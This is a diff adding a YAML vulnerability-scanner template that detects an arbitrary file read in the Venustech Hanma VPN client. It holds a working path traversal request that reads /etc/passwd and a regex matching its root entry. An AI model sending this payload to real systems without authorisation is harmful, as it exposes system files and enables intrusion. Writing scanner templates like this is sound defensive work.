@@ -1,0 +1,20 @@
+id: venustech-vpn-file-read
+info:
+  name: "Venustech VPN Client 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: venustech
+  description: |
+    This template detects an arbitrary file read vulnerability in the Venustech Hanma VPN client by attempting to access the /etc/passwd file.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vpn/user/download/client?ostype=../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
